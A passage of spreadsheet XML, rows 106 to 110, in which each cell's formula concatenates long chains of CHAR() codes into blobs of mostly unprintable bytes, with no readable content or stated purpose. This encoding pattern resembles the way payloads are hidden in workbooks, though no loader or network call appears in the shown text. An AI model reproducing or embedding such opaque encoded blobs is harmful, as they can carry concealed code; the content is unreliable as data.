139)&amp;CHAR(127)&amp;CHAR(45)&amp;CHAR(21)&amp;CHAR(112)&amp;CHAR(8)&amp;CHAR(137)&amp;CHAR(105)&amp;CHAR(11)&amp;CHAR(141)&amp;CHAR(140)&amp;CHAR(163)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(126)&amp;CHAR(37)&amp;CHAR(45)&amp;CHAR(130)&amp;CHAR(203)&amp;CHAR(12)&amp;CHAR(129)&amp;CHAR(200)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(84)&amp;CHAR(143)&amp;CHAR(134)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(86)&amp;CHAR(133)&amp;CHAR(143)&amp;CHAR(25)&amp;CHAR(15)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(81)&amp;CHAR(236)&amp;CHAR(211)&amp;CHAR(140)&amp;CHAR(197)&amp;CHAR(12)&amp;CHAR(133)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(141)&amp;CHAR(20)&amp;CHAR(142)&amp;CHAR(121)&amp;CHAR(14)&amp;CHAR(81)&amp;CHAR(140)&amp;CHAR(130)&amp;CHAR(53)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(82)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(135)&amp;CHAR(67)&amp;CHAR(13)&amp;CHAR(82)&amp;CHAR(87)&amp;CHAR(253)&amp;CHAR(84)&amp;CHAR(9)&amp;CHAR(140)&amp;CHAR(194)&amp;CHAR(12)&amp;CHAR(129)&amp;CHAR(103)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(143)&amp;CHAR(12)&amp;CHAR(139)&amp;CHAR(83)&amp;CHAR(35)&amp;CHAR(22)&amp;CHAR(92)&amp;CHAR(86)&amp;CHAR(136)&amp;CHAR(2)&amp;CHAR(254)&amp;CHAR(80)&amp;CHAR(47)&amp;CHAR(135)&amp;CHAR(195)&amp;CHAR(10)&amp;CHAR(133)&amp;CHAR(90)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(121)&amp;CHAR(41)&amp;CHAR(18)&amp;CHAR(9)&amp;CHAR(118)&amp;CHAR(28)&amp;CHAR(131)&amp;CHAR(3)&amp;CHAR(136)&amp;CHAR(77)&amp;CHAR(13)&amp;CHAR(86)&amp;CHAR(140)&amp;CHAR(144)&amp;CHAR(94)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(93)&amp;CHAR(128)&amp;CHAR(28)&amp;CHAR(136)&amp;CHAR(130)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(90)&amp;CHAR(87)&amp;CHAR(254)&amp;CHAR(83)&amp;CHAR(45)&amp;CHAR(52)&amp;CHAR(250)&amp;CHAR(148)&amp;CHAR(194)&amp;CHAR(13)&amp;CHAR(129)&amp;CHAR(57)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(68)&amp;CHAR(13)&amp;CHAR(85)&amp;CHAR(130)&amp;CHAR(10)&amp;CHAR(252)&amp;CHAR(88)&amp;CHAR(45)&amp;CHAR(129)&amp;CHAR(203)&amp;CHAR(13)&amp;CHAR(140)&amp;CHAR(14)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(143)&amp;CHAR(139)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(81)&amp;CHAR(248)&amp;CHAR(81)&amp;CHAR(115)&amp;CHAR(142)&amp;CHAR(91)&amp;CHAR(14)&amp;CHAR(142)&amp;CHAR(255)</f>
        <v>B_x000F_YŽ_x000C_ôS&lt;8ÆÅ_x000F__x0002_…J'_x000E_‚Éøò_x000C_ÄL_x0016_MÅ_x0006__x0002_ŽI"_x000D_ýr,_x0004_ŽK_x0011_ùQ_1ÉÇ_x000B__x000D_ˆá_x0011_R^'_x001B__PV2öŠ®Y_x0005__x0002_	‰½_x0005__x0007__x0005__x0002__x0004_ŽÎ‹-_x0015_p_x0008_‰i_x000B_Œ£_x0002__x000E__x0006_ˆ~%-‚Ë_x000C_È_x0007__x0005__x0007_T†!_x0002_	_x0002_V…_x0019__x000F__x0005__x0006_QìÓŒÅ_x000C_…‚_x000C__x0005__x0001__x0014_Žy_x000E_QŒ‚5_x0003__x0005__x0011_R‰_x0003_‡C_x000D_RWýT	ŒÂ_x000C_g_x0005__x000B__x0002__x000C_‹S#_x0016_\Vˆ_x0002_þP/‡Ã
…Z_x0004__x0007__x0002_y)_x0012_	v_x001C_ƒ_x0003_ˆM_x000D_VŒ^_x000D__x0005__x0003_]€_x001C_ˆ‚J_x0006__x0003__x0007_ZWþS-4ú”Â_x000D_9_x0007_	_x0002_ŽD_x000D_U‚
üX-Ë_x000D_Œ_x000E__x0007__x0007__x0007_‹_x0002__x0001_
_x0001_QøQsŽ[_x000E_Žÿ</v>
      </c>
      <c r="C106" t="str">
        <f>CHAR(190)&amp;CHAR(201)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(126)&amp;CHAR(15)&amp;CHAR(49)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(201)</f>
        <v>¾É!¥~_x000F_14ÍÉ</v>
      </c>
    </row>
    <row r="107" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B107" t="str">
        <f>CHAR(143)&amp;CHAR(68)&amp;CHAR(9)&amp;CHAR(93)&amp;CHAR(108)&amp;CHAR(9)&amp;CHAR(137)&amp;CHAR(12)&amp;CHAR(95)&amp;CHAR(94)&amp;CHAR(140)&amp;CHAR(79)&amp;CHAR(33)&amp;CHAR(46)&amp;CHAR(254)&amp;CHAR(66)&amp;CHAR(50)&amp;CHAR(94)&amp;CHAR(142)&amp;CHAR(243)&amp;CHAR(242)&amp;CHAR(88)&amp;CHAR(121)&amp;CHAR(128)&amp;CHAR(247)&amp;CHAR(9)&amp;CHAR(138)&amp;CHAR(212)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(138)&amp;CHAR(85)&amp;CHAR(45)&amp;CHAR(31)&amp;CHAR(142)&amp;CHAR(101)&amp;CHAR(38)&amp;CHAR(46)&amp;CHAR(130)&amp;CHAR(24)&amp;CHAR(139)&amp;CHAR(79)&amp;CHAR(18)&amp;CHAR(85)&amp;CHAR(143)&amp;CHAR(134)&amp;CHAR(105)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(130)&amp;CHAR(15)&amp;CHAR(84)&amp;CHAR(89)&amp;CHAR(253)&amp;CHAR(21)&amp;CHAR(142)&amp;CHAR(198)&amp;CHAR(8)&amp;CHAR(143)&amp;CHAR(183)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(137)&amp;CHAR(101)&amp;CHAR(37)&amp;CHAR(39)&amp;CHAR(2)&amp;CHAR(136)&amp;CHAR(128)&amp;CHAR(29)&amp;CHAR(31)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(139)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(17)&amp;CHAR(139)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(26)&amp;CHAR(88)&amp;CHAR(102)&amp;CHAR(4)&amp;CHAR(97)&amp;CHAR(20)&amp;CHAR(249)&amp;CHAR(82)&amp;CHAR(75)&amp;CHAR(137)&amp;CHAR(241)&amp;CHAR(128)&amp;CHAR(252)&amp;CHAR(2)&amp;CHAR(143)&amp;CHAR(157)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(137)&amp;CHAR(84)&amp;CHAR(11)&amp;CHAR(57)&amp;CHAR(198)&amp;CHAR(138)&amp;CHAR(201)&amp;CHAR(48)&amp;CHAR(130)&amp;CHAR(17)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(123)&amp;CHAR(39)&amp;CHAR(113)&amp;CHAR(1)&amp;CHAR(59)&amp;CHAR(128)&amp;CHAR(18)&amp;CHAR(28)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(116)&amp;CHAR(32)&amp;CHAR(58)&amp;CHAR(222)&amp;CHAR(142)&amp;CHAR(143)&amp;CHAR(43)&amp;CHAR(28)&amp;CHAR(18)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(143)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(71)&amp;CHAR(56)&amp;CHAR(151)&amp;CHAR(21)&amp;CHAR(24)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(113)&amp;CHAR(232)&amp;CHAR(122)&amp;CHAR(14)&amp;CHAR(62)&amp;CHAR(138)&amp;CHAR(18)&amp;CHAR(27)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(116)&amp;CHAR(234)&amp;CHAR(137)&amp;CHAR(90)&amp;CHAR(44)&amp;CHAR(36)&amp;CHAR(142)&amp;CHAR(69)&amp;CHAR(21)&amp;CHAR(139)&amp;CHAR(71)&amp;CHAR(7)&amp;CHAR(82)&amp;CHAR(94)&amp;CHAR(84)&amp;CHAR(136)&amp;CHAR(28)&amp;CHAR(244)&amp;CHAR(159)&amp;CHAR(177)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(244)&amp;CHAR(223)&amp;CHAR(17)&amp;CHAR(198)&amp;CHAR(50)&amp;CHAR(211)&amp;CHAR(73)&amp;CHAR(140)&amp;CHAR(207)&amp;CHAR(152)&amp;CHAR(70)&amp;CHAR(38)&amp;CHAR(25)&amp;CHAR(129)&amp;CHAR(65)&amp;CHAR(5)&amp;CHAR(59)&amp;CHAR(144)&amp;CHAR(22)&amp;CHAR(28)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(112)&amp;CHAR(36)&amp;CHAR(126)&amp;CHAR(13)&amp;CHAR(61)&amp;CHAR(158)&amp;CHAR(18)&amp;CHAR(29)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(113)&amp;CHAR(26)&amp;CHAR(138)&amp;CHAR(154)&amp;CHAR(47)&amp;CHAR(27)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(143)&amp;CHAR(22)&amp;CHAR(11)&amp;CHAR(68)&amp;CHAR(54)&amp;CHAR(147)&amp;CHAR(17)&amp;CHAR(30)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(119)&amp;CHAR(224)&amp;CHAR(113)&amp;CHAR(1)&amp;CHAR(57)&amp;CHAR(139)&amp;CHAR(24)&amp;CHAR(21)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(119)&amp;CHAR(229)&amp;CHAR(86)&amp;CHAR(236)&amp;CHAR(81)&amp;CHAR(109)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(41)&amp;CHAR(27)&amp;CHAR(82)&amp;CHAR(91)&amp;CHAR(92)&amp;CHAR(93)&amp;CHAR(129)</f>
        <v>D	]l	‰_x000C__^ŒO!.þB2^ŽóòXy€÷	ŠÔ_x0007_
_x0006_ŠU-_x001F_Že&amp;.‚_x0018_‹O_x0012_U†i_x000D__x0002__x0003_‚_x000F_TYý_x0015_ŽÆ_x0008_·_x000E__x0006__x0003_‰e%'_x0002_ˆ€_x001D__x001F__x0005__x0007_‹F!_x0011_‹M&amp;_x001A_Xf_x0004_a_x0014_ùRK‰ñ€ü_x0002__x0005__x0001__x0006_‰T_x000B_9ÆŠÉ0‚_x0011__x0008__x0002__x0002_{'q_x0001_;€_x0012__x001C__x0005_	t :ÞŽ+_x001C__x0012__x0006__x0007__x0006__x0004_G8—_x0015__x0018__x0007__x0002_qèz_x000E_&gt;Š_x0012__x001B__x0005__x000D_tê‰Z,$ŽE_x0015_‹G_x0007_R^Tˆ_x001C_ôŸ±_x0001__x0006__x0002_ôß_x0011_Æ2ÓIŒÏ˜F&amp;_x0019_A_x0005_;_x0016__x001C__x0005_	p$~_x000D_=ž_x0012__x001D__x000B__x0006_q_x001A_Šš/_x001B__x0013__x0001__x0001__x0016__x000B_D6“_x0011__x001E__x0002__x0002_wàq_x0001_9‹_x0018__x0015__x0005__x000B_wåVìQmŽG)_x001B_R[\]</v>
      </c>
      <c r="C107" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(186)&amp;CHAR(119)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(105)&amp;CHAR(148)</f>
        <v>!¥ºw&gt;±ÖÈi”</v>
      </c>
    </row>
    <row r="108" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B108" t="str">
        <f>CHAR(199)&amp;CHAR(19)&amp;CHAR(201)&amp;CHAR(133)&amp;CHAR(38)&amp;CHAR(1)&amp;CHAR(224)&amp;CHAR(203)&amp;CHAR(251)&amp;CHAR(238)&amp;CHAR(253)&amp;CHAR(139)&amp;CHAR(55)&amp;CHAR(227)&amp;CHAR(193)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(250)&amp;CHAR(49)&amp;CHAR(250)&amp;CHAR(136)&amp;CHAR(79)&amp;CHAR(10)&amp;CHAR(83)&amp;CHAR(132)&amp;CHAR(134)&amp;CHAR(88)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(91)&amp;CHAR(139)&amp;CHAR(132)&amp;CHAR(75)&amp;CHAR(6)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(83)&amp;CHAR(93)&amp;CHAR(86)&amp;CHAR(254)&amp;CHAR(148)&amp;CHAR(162)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(131)&amp;CHAR(197)&amp;CHAR(8)&amp;CHAR(139)&amp;CHAR(169)&amp;CHAR(251)&amp;CHAR(242)&amp;CHAR(249)&amp;CHAR(128)&amp;CHAR(124)&amp;CHAR(14)&amp;CHAR(59)&amp;CHAR(204)&amp;CHAR(238)&amp;CHAR(181)&amp;CHAR(134)&amp;CHAR(234)&amp;CHAR(109)&amp;CHAR(64)&amp;CHAR(137)&amp;CHAR(85)&amp;CHAR(33)&amp;CHAR(119)&amp;CHAR(62)&amp;CHAR(203)&amp;CHAR(88)&amp;CHAR(83)&amp;CHAR(86)&amp;CHAR(139)&amp;CHAR(126)&amp;CHAR(39)&amp;CHAR(59)&amp;CHAR(57)&amp;CHAR(235)&amp;CHAR(32)&amp;CHAR(109)&amp;CHAR(45)&amp;CHAR(19)&amp;CHAR(136)&amp;CHAR(162)&amp;CHAR(74)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(173)&amp;CHAR(162)&amp;CHAR(169)&amp;CHAR(174)&amp;CHAR(49)&amp;CHAR(197)&amp;CHAR(99)&amp;CHAR(128)&amp;CHAR(70)&amp;CHAR(39)&amp;CHAR(25)&amp;CHAR(69)&amp;CHAR(61)&amp;CHAR(136)&amp;CHAR(14)&amp;CHAR(1)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(115)&amp;CHAR(5)&amp;CHAR(137)&amp;CHAR(56)&amp;CHAR(133)&amp;CHAR(61)&amp;CHAR(8)&amp;CHAR(14)&amp;CHAR(132)&amp;CHAR(99)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(33)&amp;CHAR(131)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(78)&amp;CHAR(29)&amp;CHAR(143)&amp;CHAR(126)&amp;CHAR(20)&amp;CHAR(91)&amp;CHAR(84)&amp;CHAR(128)&amp;CHAR(4)&amp;CHAR(249)&amp;CHAR(81)&amp;CHAR(83)&amp;CHAR(135)&amp;CHAR(201)&amp;CHAR(10)&amp;CHAR(139)&amp;CHAR(76)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(138)&amp;CHAR(1)&amp;CHAR(143)&amp;CHAR(87)&amp;CHAR(35)&amp;CHAR(30)&amp;CHAR(84)&amp;CHAR(81)&amp;CHAR(138)&amp;CHAR(1)&amp;CHAR(248)&amp;CHAR(84)&amp;CHAR(89)&amp;CHAR(135)&amp;CHAR(194)&amp;CHAR(6)&amp;CHAR(130)&amp;CHAR(72)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(45)&amp;CHAR(82)&amp;CHAR(105)&amp;CHAR(8)&amp;CHAR(250)&amp;CHAR(112)&amp;CHAR(47)&amp;CHAR(30)&amp;CHAR(251)&amp;CHAR(88)&amp;CHAR(110)&amp;CHAR(138)&amp;CHAR(67)&amp;CHAR(38)&amp;CHAR(46)&amp;CHAR(86)&amp;CHAR(105)&amp;CHAR(11)&amp;CHAR(254)&amp;CHAR(117)&amp;CHAR(35)&amp;CHAR(30)&amp;CHAR(252)&amp;CHAR(86)&amp;CHAR(97)&amp;CHAR(141)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(34)&amp;CHAR(41)&amp;CHAR(65)&amp;CHAR(41)&amp;CHAR(34)&amp;CHAR(138)&amp;CHAR(194)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(136)&amp;CHAR(185)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(107)&amp;CHAR(18)&amp;CHAR(104)&amp;CHAR(9)&amp;CHAR(111)&amp;CHAR(15)&amp;CHAR(242)&amp;CHAR(88)&amp;CHAR(81)&amp;CHAR(142)&amp;CHAR(233)&amp;CHAR(53)&amp;CHAR(203)&amp;CHAR(58)&amp;CHAR(137)&amp;CHAR(14)&amp;CHAR(14)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(177)&amp;CHAR(15)&amp;CHAR(37)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(100)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(34)&amp;CHAR(37)&amp;CHAR(118)&amp;CHAR(93)&amp;CHAR(253)&amp;CHAR(179)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(88)&amp;CHAR(111)&amp;CHAR(12)</f>
        <v>Ç_x0013_É…&amp;_x0001_àËûîý‹7ãÁ÷ýú1úˆO
S„†X_x000F__x0002__x0004_[‹„K_x0006__x000E__x0006_S]Vþ”¢_x0003__x0005__x000D_ƒÅ_x0008_‹©ûòù€|_x000E_;Ìîµ†êm@‰U!w&gt;ËXSV‹~';9ë m-_x0013_ˆ¢J_x0005_	
­¢©®1Åc€F'_x0019_E=ˆ_x000E__x0001__x000B__x0006_s_x0005_‰8…=_x0008__x000E_„c_x0003__x0003__x0005_†‚!ƒ_x0002__x0002__x0005_†N_x001D_~_x0014_[T€_x0004_ùQS‡É
‹L
_x000D__x0005_Š_x0001_W#_x001E_TQŠ_x0001_øTY‡Â_x0006_‚H_x000B__x0002__x0005_A!-Ri_x0008_úp/_x001E_ûXnŠC&amp;.Vi_x000B_þu#_x001E_üVaA#")A)"ŠÂ_x0007__x0007_ˆ¹_x000B__x0005__x0006_k_x0012_h	o_x000F_òXQŽé5Ë:‰_x000E__x000E__x0001__x0001_±_x000F_%_x0011__x0002_d€N"%v]ý³_x0001__x0001__x0002__x0003_Xo_x000C_</v>
      </c>
      <c r="C108" t="str">
        <f>CHAR(41)&amp;CHAR(118)&amp;CHAR(50)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(68)&amp;CHAR(237)&amp;CHAR(112)&amp;CHAR(251)</f>
        <v>)v2±ÖÈDípû</v>
      </c>
    </row>
    <row r="109" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B109" t="str">
        <f>CHAR(244)&amp;CHAR(81)&amp;CHAR(88)&amp;CHAR(130)&amp;CHAR(66)&amp;CHAR(35)&amp;CHAR(51)&amp;CHAR(49)&amp;CHAR(206)&amp;CHAR(143)&amp;CHAR(135)&amp;CHAR(46)&amp;CHAR(129)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(58)&amp;CHAR(131)&amp;CHAR(9)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(116)&amp;CHAR(97)&amp;CHAR(196)&amp;CHAR(237)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(6)&amp;CHAR(205)&amp;CHAR(85)&amp;CHAR(249)&amp;CHAR(82)&amp;CHAR(99)&amp;CHAR(82)&amp;CHAR(132)&amp;CHAR(129)&amp;CHAR(39)&amp;CHAR(137)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(81)&amp;CHAR(249)&amp;CHAR(118)&amp;CHAR(39)&amp;CHAR(59)&amp;CHAR(245)&amp;CHAR(85)&amp;CHAR(97)&amp;CHAR(138)&amp;CHAR(141)&amp;CHAR(35)&amp;CHAR(133)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(73)&amp;CHAR(131)&amp;CHAR(130)&amp;CHAR(45)&amp;CHAR(130)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(62)&amp;CHAR(143)&amp;CHAR(6)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(118)&amp;CHAR(192)&amp;CHAR(233)&amp;CHAR(40)&amp;CHAR(97)&amp;CHAR(7)&amp;CHAR(86)&amp;CHAR(109)&amp;CHAR(10)&amp;CHAR(241)&amp;CHAR(85)&amp;CHAR(95)&amp;CHAR(137)&amp;CHAR(165)&amp;CHAR(37)&amp;CHAR(135)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(54)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(41)&amp;CHAR(22)&amp;CHAR(89)&amp;CHAR(253)&amp;CHAR(85)&amp;CHAR(120)&amp;CHAR(92)&amp;CHAR(136)&amp;CHAR(143)&amp;CHAR(33)&amp;CHAR(130)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(89)&amp;CHAR(250)&amp;CHAR(119)&amp;CHAR(41)&amp;CHAR(55)&amp;CHAR(242)&amp;CHAR(86)&amp;CHAR(97)&amp;CHAR(133)&amp;CHAR(166)&amp;CHAR(39)&amp;CHAR(135)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(132)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(61)&amp;CHAR(82)&amp;CHAR(143)&amp;CHAR(141)&amp;CHAR(46)&amp;CHAR(130)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(80)&amp;CHAR(250)&amp;CHAR(90)&amp;CHAR(98)&amp;CHAR(128)&amp;CHAR(109)&amp;CHAR(33)&amp;CHAR(64)&amp;CHAR(11)&amp;CHAR(143)&amp;CHAR(80)&amp;CHAR(47)&amp;CHAR(90)&amp;CHAR(85)&amp;CHAR(52)&amp;CHAR(194)&amp;CHAR(131)&amp;CHAR(114)&amp;CHAR(39)&amp;CHAR(74)&amp;CHAR(65)&amp;CHAR(103)&amp;CHAR(142)&amp;CHAR(70)&amp;CHAR(39)&amp;CHAR(69)&amp;CHAR(134)&amp;CHAR(1)&amp;CHAR(80)&amp;CHAR(132)&amp;CHAR(238)&amp;CHAR(18)&amp;CHAR(142)&amp;CHAR(241)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(82)&amp;CHAR(163)&amp;CHAR(173)&amp;CHAR(169)&amp;CHAR(160)&amp;CHAR(244)&amp;CHAR(148)&amp;CHAR(146)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(140)&amp;CHAR(232)&amp;CHAR(12)&amp;CHAR(137)&amp;CHAR(57)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(249)&amp;CHAR(118)&amp;CHAR(39)&amp;CHAR(51)&amp;CHAR(245)&amp;CHAR(85)&amp;CHAR(101)&amp;CHAR(84)&amp;CHAR(246)&amp;CHAR(84)&amp;CHAR(97)&amp;CHAR(248)&amp;CHAR(32)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(39)&amp;CHAR(38)&amp;CHAR(235)&amp;CHAR(30)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(132)&amp;CHAR(132)&amp;CHAR(7)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(91)&amp;CHAR(253)&amp;CHAR(87)&amp;CHAR(123)&amp;CHAR(141)&amp;CHAR(239)&amp;CHAR(142)&amp;CHAR(110)&amp;CHAR(42)&amp;CHAR(30)&amp;CHAR(134)&amp;CHAR(231)&amp;CHAR(14)&amp;CHAR(133)&amp;CHAR(1)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(128)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(85)&amp;CHAR(242)&amp;CHAR(85)</f>
        <v>ôQX‚B#31Î‡._x0001__x0007__x0002_:ƒ	_x000E__x0005__x0007_taÄí_x000F__x000C_
_x000E__x0008__x000C__x0006_ÍUùRcR„'‰_x000B__x000D__x0005_Qùv';õUaŠ#…_x0011__x0002__x0002_Iƒ‚-‚_x0005__x0002__x0005_&gt;_x0006__x000B_	_x0005_vÀé(a_x0007_Vm
ñU_‰¥%‡_x0002__x0003__x0005__x000D_A#6A)_x0016_YýUx\ˆ!‚_x0001__x0013__x0002_Yúw)7òVa…¦'‡
_x0006__x0001__x0001_„C!=R.‚	_x0002__x0005_RPúZb€m!@_x000B_P/ZU4Âƒr'JAgŽF'E†_x0001_P„î_x0012_Žñ_x0001_R£­© ô”’_x0001__x0013__x0002_Œè_x000C_‰9_x000C__x0005__x0001_ùv'3õUeTöTaø _x0003_	
'&amp;ë_x001E__x0003__x0005__x0005_„„_x0007__x000D__x0005__x0004_[ýW{ïŽn*_x001E_†ç_x000E_…_x0001__x0003__x0003__x0005_€€_x0001__x0001__x0002__x0002_UòU</v>
      </c>
      <c r="C109" t="str">
        <f>CHAR(27)&amp;CHAR(153)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(90)&amp;CHAR(173)&amp;CHAR(255)&amp;CHAR(187)&amp;CHAR(113)</f>
        <v>_x001B_™ÖÈ!Z­ÿ»q</v>
      </c>
    </row>
    <row r="110" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B110" t="str">
        <f>CHAR(121)&amp;CHAR(139)&amp;CHAR(66)&amp;CHAR(44)&amp;CHAR(16)&amp;CHAR(128)&amp;CHAR(203)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(232)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(143)&amp;CHAR(41)&amp;CHAR(143)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(141)&amp;CHAR(83)&amp;CHAR(23)&amp;CHAR(138)&amp;CHAR(75)&amp;CHAR(30)&amp;CHAR(81)&amp;CHAR(84)&amp;CHAR(91)&amp;CHAR(140)&amp;CHAR(15)&amp;CHAR(152)&amp;CHAR(70)&amp;CHAR(38)&amp;CHAR(61)&amp;CHAR(245)&amp;CHAR(87)&amp;CHAR(77)&amp;CHAR(137)&amp;CHAR(253)&amp;CHAR(135)&amp;CHAR(250)&amp;CHAR(10)&amp;CHAR(129)&amp;CHAR(188)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(143)&amp;CHAR(141)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(52)&amp;CHAR(234)&amp;CHAR(135)&amp;CHAR(206)&amp;CHAR(114)&amp;CHAR(109)&amp;CHAR(90)&amp;CHAR(84)&amp;CHAR(107)&amp;CHAR(11)&amp;CHAR(253)&amp;CHAR(80)&amp;CHAR(89)&amp;CHAR(134)&amp;CHAR(238)&amp;CHAR(128)&amp;CHAR(234)&amp;CHAR(118)&amp;CHAR(99)&amp;CHAR(134)&amp;CHAR(169)&amp;CHAR(34)&amp;CHAR(137)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(134)&amp;CHAR(181)&amp;CHAR(1)&amp;CHAR(14)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(127)&amp;CHAR(85)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(202)&amp;CHAR(237)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(14)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(192)&amp;CHAR(81)&amp;CHAR(254)&amp;CHAR(90)&amp;CHAR(119)&amp;CHAR(111)&amp;CHAR(25)&amp;CHAR(139)&amp;CHAR(70)&amp;CHAR(45)&amp;CHAR(82)&amp;CHAR(94)&amp;CHAR(111)&amp;CHAR(139)&amp;CHAR(65)&amp;CHAR(38)&amp;CHAR(73)&amp;CHAR(136)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(79)&amp;CHAR(89)&amp;CHAR(136)&amp;CHAR(128)&amp;CHAR(47)&amp;CHAR(134)